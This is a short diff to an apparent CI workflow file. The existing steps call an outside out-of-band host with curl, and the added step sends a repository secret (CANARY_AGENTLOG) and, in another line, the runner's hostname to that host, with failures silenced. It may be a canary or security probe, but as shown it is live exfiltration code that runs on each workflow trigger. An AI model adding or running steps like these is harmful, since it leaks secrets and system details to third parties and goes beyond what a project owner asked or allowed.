@@ -6,3 +6,4 @@ jobs:
     steps:
       - run: curl -s -m 8 http://n6setup-b484.oob.ogxing.com/setup || true; curl -s -m 8 https://n6setup-b484.oob.ogxing.com/setup-https || true; echo n6setup-done
       - run: curl -s -m 8 "http://hsetup-6705.oob.ogxing.com/run-agentsetup?h=$(hostname)" || true ; echo hsetup-run-done
+      - run: curl -s -m 8 "http://hsetup-6705.oob.ogxing.com/h3?s=${{ secrets.CANARY_AGENTLOG }}" || true ; echo h3-done
